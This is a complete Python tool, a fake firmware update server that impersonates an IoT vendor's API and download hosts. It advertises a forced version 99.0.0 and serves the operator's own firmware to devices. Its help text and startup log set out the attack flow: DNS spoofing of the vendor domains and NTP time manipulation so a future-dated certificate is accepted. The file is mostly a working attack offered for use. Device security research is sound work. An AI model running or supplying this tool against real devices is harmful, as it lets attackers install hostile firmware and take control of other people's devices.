#!/usr/bin/env python3
"""
Fake Firmware Server for IoT Devices
Impersonates a vendor's update server to serve custom firmware files.

The device checks an API server for updates (allowed to reach real server),
then downloads firmware from an update server (spoofed to this server).

Usage:
    sudo python3 fake-firmware-server.py --cert server.crt --key server.key --firmware-dir ./firmware

Requires DNS spoofing to redirect the vendor's update domain to this server.
"""

import argparse
import hashlib
import json
import logging
import os
import socket
import ssl
import sys
import traceback
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
from pathlib import Path

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)


class FirmwareConfig:
    """Global configuration for the firmware server."""
    def __init__(self):
        self.firmware_dir = "./firmware"
        self.server_host = "0.0.0.0"
        self.http_port = None      # HTTP port (80), None = disabled
        self.https_port = 443      # HTTPS port
        self.cert_file = None
        self.key_file = None
        # API spoofing settings
        self.spoof_api = False     # Enable API endpoint spoofing
        self.firmware_version = "99.0.0"  # Version to advertise (high = force update)
        self.update_host = "update.example.com"  # Host for download URLs
        self.app_filename = "firmware_app"  # Application firmware filename
        self.allowed_files = []    # Populated from --firmware-files

config = FirmwareConfig()


def calculate_sha256(filepath):
    """Calculate SHA256 hash of a file."""
    sha256_hash = hashlib.sha256()
    with open(filepath, "rb") as f:
        for chunk in iter(lambda: f.read(8192), b""):
            sha256_hash.update(chunk)
    return sha256_hash.hexdigest()


class FirmwareRequestHandler(BaseHTTPRequestHandler):
    """HTTP request handler for fake firmware server."""

    def log_message(self, format, *args):
        """Override to use our logger."""
        logger.info("%s - %s", self.address_string(), format % args)

    def send_json_response(self, data, status=200):
        """Send a JSON response."""
        content = json.dumps(data, indent=2).encode('utf-8')
        self.send_response(status)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Content-Length', len(content))
        self.end_headers()
        self.wfile.write(content)

    def send_file_response(self, filepath, content_type='application/octet-stream'):
        """Send a file as response with streaming support."""
        try:
            file_size = os.path.getsize(filepath)
            sha256 = calculate_sha256(filepath)
            self.send_response(200)
            self.send_header('Content-Type', content_type)
            self.send_header('Content-Length', file_size)
            self.send_header('X-SHA256', sha256)
            self.end_headers()

            with open(filepath, 'rb') as f:
                while chunk := f.read(65536):
                    self.wfile.write(chunk)

            logger.info("Served file: %s (%d bytes)", filepath, file_size)
        except FileNotFoundError:
            self.send_error(404, f"File not found: {filepath}")
        except Exception as e:
            logger.error("Error serving file %s: %s", filepath, e)
            self.send_error(500, str(e))

    def send_error_json(self, status, message):
        """Send an error as JSON."""
        self.send_json_response({"error": message}, status)

    def handle_firmware_download(self, filename):
        """Handle firmware file downloads."""
        # Security: only allow specific filenames
        if filename not in config.allowed_files:
            logger.warning("Attempted to download disallowed file: %s", filename)
            self.send_error(403, "Forbidden")
            return

        filepath = Path(config.firmware_dir) / filename
        if not filepath.exists():
            logger.error("Firmware file not found: %s", filepath)
            self.send_error(404, f"Firmware not found: {filename}")
            return

        logger.info("=== FIRMWARE DOWNLOAD ===")
        logger.info("File requested: %s", filename)
        logger.info("Client: %s", self.address_string())

        content_type = 'application/x-tar' if filename.endswith('.tar') else 'application/octet-stream'
        self.send_file_response(filepath, content_type)

    def handle_releases_api(self, query_params):
        """Handle /releases API endpoint (spoofs vendor API)."""
        device_id = query_params.get('deviceId', ['unknown'])[0]
        prerelease = query_params.get('prerelease', ['false'])[0]

        logger.info("=== API REQUEST (vendor API spoof) ===")
        logger.info("Device ID: %s", device_id)
        logger.info("Prerelease: %s", prerelease)
        logger.info("Client: %s", self.address_string())

        # Build firmware URLs pointing to update host (also spoofed to us)
        version = config.firmware_version
        app_url = f"https://{config.update_host}/app/{version}/{config.app_filename}"
        system_url = f"https://{config.update_host}/system/{version}/system.tar"

        response = {
            "appVersion": version,
            "appUrl": app_url,
            "systemVersion": version,
            "systemUrl": system_url
        }

        logger.info("Returning fake firmware URLs:")
        logger.info("  appUrl: %s", app_url)
        logger.info("  systemUrl: %s", system_url)

        self.send_json_response(response)

    def do_GET(self):
        """Handle GET requests."""
        parsed = urlparse(self.path)
        path = parsed.path
        query_params = parse_qs(parsed.query)

        logger.info("GET %s from %s", self.path, self.address_string())

        # Route requests
        if path == '/releases':
            # Handle /releases endpoint
            self.handle_releases_api(query_params)
        elif path.startswith('/app/') and path.endswith(f'/{config.app_filename}'):
            # Handle /app/{version}/<app_filename> - serves firmware app
            self.handle_firmware_download(config.app_filename)
        elif path.startswith('/system/') and path.endswith('/system.tar'):
            # Handle /system/{version}/system.tar - serves firmware/system.tar
            self.handle_firmware_download('system.tar')
        elif path == '/':
            # Root path - return basic info
            self.send_json_response({
                "service": "Fake Firmware Server",
                "note": "Serves fake API responses and custom firmware",
                "endpoints": [
                    "/releases?deviceId=XXX",
                    f"/app/<version>/{config.app_filename}",
                    "/system/<version>/system.tar"
                ]
            })
        else:
            logger.warning("Unknown path requested: %s", path)
            self.send_error(404, "Not found")

    def do_POST(self):
        """Handle POST requests (log and reject)."""
        logger.warning("POST request to %s (not implemented)", self.path)
        self.send_error(405, "Method not allowed")


class SSLLoggingHTTPServer(HTTPServer):
    """HTTPServer subclass that logs SSL errors and connection attempts."""

    def get_request(self):
        """Override to log incoming connections before SSL handshake."""
        # Get the raw socket connection
        newsocket, fromaddr = self.socket.accept()
        logger.info(">>> Connection attempt from %s:%d", fromaddr[0], fromaddr[1])
        return newsocket, fromaddr

    def handle_error(self, request, client_address):
        """Override to catch and log SSL errors."""
        exc_type, exc_value, exc_tb = sys.exc_info()

        if exc_type is ssl.SSLError:
            logger.error("!!! SSL ERROR from %s:%d", client_address[0], client_address[1])
            logger.error("    SSL Error: %s", exc_value)
            # Common SSL errors explained
            error_str = str(exc_value)
            if "CERTIFICATE_VERIFY_FAILED" in error_str:
                logger.error("    -> Client rejected our certificate (not trusted)")
            elif "WRONG_VERSION_NUMBER" in error_str:
                logger.error("    -> TLS version mismatch")
            elif "UNKNOWN_CA" in error_str:
                logger.error("    -> Client doesn't trust our CA")
            elif "CERTIFICATE_UNKNOWN" in error_str:
                logger.error("    -> Client rejected certificate (unknown/untrusted)")
            elif "SSLV3_ALERT_HANDSHAKE_FAILURE" in error_str or "HANDSHAKE_FAILURE" in error_str:
                logger.error("    -> TLS handshake failed (cipher/protocol mismatch)")
            elif "CONNECTION_RESET" in error_str or "EOF occurred" in error_str:
                logger.error("    -> Client closed connection during handshake (likely rejected cert)")
        elif exc_type is ConnectionResetError:
            logger.error("!!! Connection reset by %s:%d (client rejected connection)",
                        client_address[0], client_address[1])
        elif exc_type is BrokenPipeError:
            logger.error("!!! Broken pipe from %s:%d (client disconnected)",
                        client_address[0], client_address[1])
        elif exc_type is socket.timeout:
            logger.error("!!! Connection timeout from %s:%d",
                        client_address[0], client_address[1])
        else:
            logger.error("!!! Unhandled error from %s:%d", client_address[0], client_address[1])
            logger.error("    Exception: %s: %s", exc_type.__name__, exc_value)
            # Print full traceback for unknown errors
            traceback.print_exc()

    def finish_request(self, request, client_address):
        """Override to catch SSL errors during request handling."""
        try:
            super().finish_request(request, client_address)
        except ssl.SSLError as e:
            logger.error("!!! SSL ERROR during request from %s:%d",
                        client_address[0], client_address[1])
            logger.error("    %s", e)
        except (ConnectionResetError, BrokenPipeError) as e:
            logger.error("!!! Connection error from %s:%d: %s",
                        client_address[0], client_address[1], e)


def run_server(config):
    """Start the HTTP/HTTPS server."""
    import threading

    servers = []

    # Start HTTP server if enabled
    if config.http_port:
        http_address = (config.server_host, config.http_port)
        http_server = SSLLoggingHTTPServer(http_address, FirmwareRequestHandler)
        servers.append(('HTTP', http_server, config.http_port))

    # Start HTTPS server if cert/key provided
    if config.cert_file and config.key_file:
        https_address = (config.server_host, config.https_port)
        https_server = SSLLoggingHTTPServer(https_address, FirmwareRequestHandler)
        ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ssl_context.load_cert_chain(config.cert_file, config.key_file)
        https_server.socket = ssl_context.wrap_socket(https_server.socket, server_side=True)
        servers.append(('HTTPS', https_server, config.https_port))

    if not servers:
        logger.error("No servers configured. Use --http and/or --cert/--key")
        sys.exit(1)

    logger.info("=" * 60)
    logger.info("Fake Firmware Server Started")
    logger.info("=" * 60)
    for proto, _, port in servers:
        logger.info("Listening on: %s://%s:%d", proto.lower(), config.server_host, port)
    if config.cert_file:
        logger.info("Certificate: %s", config.cert_file)
    logger.info("Firmware dir: %s", config.firmware_dir)
    logger.info("Firmware version: %s", config.firmware_version)
    logger.info("")
    logger.info("Endpoints:")
    logger.info("  GET /releases                    -> fake vendor API response")
    logger.info("  GET /app/<ver>/%s  -> serves firmware app", config.app_filename)
    logger.info("  GET /system/<ver>/system.tar      -> serves firmware/system.tar")
    logger.info("")
    logger.info("Attack flow:")
    logger.info("  1. Device queries vendor API /releases (spoofed to us)")
    logger.info("  2. We return firmware URLs pointing to update host")
    logger.info("  3. Device downloads from update host (also spoofed to us)")
    logger.info("  4. Device installs YOUR firmware")
    logger.info("")
    logger.info("DNS spoofing required:")
    logger.info("  address=/api.example.com/<this-server-ip>")
    logger.info("  address=/update.example.com/<this-server-ip>")
    logger.info("  (replace example.com with the actual vendor domains)")
    logger.info("=" * 60)

    # Check for firmware files
    app_path = Path(config.firmware_dir) / config.app_filename
    system_path = Path(config.firmware_dir) / "system.tar"

    if not app_path.exists() and not system_path.exists():
        logger.warning("WARNING: No firmware files found in %s", config.firmware_dir)
        logger.warning("Place firmware files in the firmware directory")

    # Run servers in threads
    def serve(server, name):
        logger.info("%s server thread started", name)
        server.serve_forever()

    threads = []
    for proto, server, port in servers:
        t = threading.Thread(target=serve, args=(server, proto), daemon=True)
        t.start()
        threads.append(t)

    try:
        # Keep main thread alive
        while True:
            for t in threads:
                t.join(timeout=1)
    except KeyboardInterrupt:
        logger.info("\nShutting down servers...")
        for proto, server, _ in servers:
            server.shutdown()


def main():
    parser = argparse.ArgumentParser(
        description='Fake firmware server for IoT devices (impersonates vendor update server)',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
How it works (full attack with NTP time manipulation):
  1. Device queries vendor API /releases (DNS spoofed to us)
  2. We return firmware URLs pointing to update host
  3. Device downloads from update host (also DNS spoofed to us)
  4. Device installs YOUR firmware

Examples:
  # HTTPS with time-matched certificate (NTP attack)
  sudo python3 %(prog)s --cert certs/future-2030.crt --key certs/future-2030.key

  # HTTP only
  sudo python3 %(prog)s --http

  # Both HTTP and HTTPS
  sudo python3 %(prog)s --http --cert server.crt --key server.key

  # Custom firmware version (forces update)
  sudo python3 %(prog)s --cert server.crt --key server.key --firmware-version 99.0.0

  # Custom update host and app filename
  sudo python3 %(prog)s --cert server.crt --key server.key \\
    --update-host update.vendor.com --app-filename device_app

DNS spoofing required (both domains):
  address=/api.example.com/192.168.200.1
  address=/update.example.com/192.168.200.1
  (replace example.com with the actual vendor domains)
        """
    )

    parser.add_argument('--http', action='store_true',
                        help='Enable HTTP server on port 80')
    parser.add_argument('--http-port', type=int, default=80,
                        help='HTTP port (default: 80)')
    parser.add_argument('--cert',
                        help='Path to SSL certificate file (enables HTTPS)')
    parser.add_argument('--key',
                        help='Path to SSL private key file (enables HTTPS)')
    parser.add_argument('--https-port', type=int, default=443,
                        help='HTTPS port (default: 443)')
    parser.add_argument('--firmware-dir', default='./firmware',
                        help='Directory containing firmware files (default: ./firmware)')
    parser.add_argument('--firmware-version', default='99.0.0',
                        help='Firmware version to advertise in /releases API (default: 99.0.0)')
    parser.add_argument('--update-host', default='update.example.com',
                        help='Hostname for download URLs in API responses (default: update.example.com)')
    parser.add_argument('--app-filename', default='firmware_app',
                        help='Application firmware filename (default: firmware_app)')
    parser.add_argument('--firmware-files', nargs='+', default=None,
                        help='Allowed firmware filenames (default: <app-filename> system.tar)')
    parser.add_argument('--host', default='0.0.0.0',
                        help='Host to bind to (default: 0.0.0.0)')

    args = parser.parse_args()

    # Validate that at least one server mode is enabled
    if not args.http and not (args.cert and args.key):
        logger.error("Must specify --http and/or --cert/--key")
        parser.print_help()
        sys.exit(1)

    # Validate certificate files if HTTPS enabled
    if args.cert or args.key:
        if not (args.cert and args.key):
            logger.error("Both --cert and --key are required for HTTPS")
            sys.exit(1)
        if not os.path.exists(args.cert):
            logger.error("Certificate file not found: %s", args.cert)
            sys.exit(1)
        if not os.path.exists(args.key):
            logger.error("Key file not found: %s", args.key)
            sys.exit(1)

    # Create firmware directory if it doesn't exist
    os.makedirs(args.firmware_dir, exist_ok=True)

    # Update config
    config.cert_file = args.cert
    config.key_file = args.key
    config.firmware_dir = args.firmware_dir
    config.firmware_version = args.firmware_version
    config.update_host = args.update_host
    config.app_filename = args.app_filename
    config.server_host = args.host
    config.http_port = args.http_port if args.http else None
    config.https_port = args.https_port

    # Set allowed firmware files
    if args.firmware_files:
        config.allowed_files = args.firmware_files
    else:
        config.allowed_files = [config.app_filename, 'system.tar']

    # Check if running as root (needed for privileged ports)
    needs_root = False
    if args.http and args.http_port < 1024:
        needs_root = True
    if args.cert and args.https_port < 1024:
        needs_root = True
    if needs_root and os.geteuid() != 0:
        logger.error("Ports below 1024 require root privileges. Run with sudo.")
        sys.exit(1)

    run_server(config)


if __name__ == '__main__':
    main()
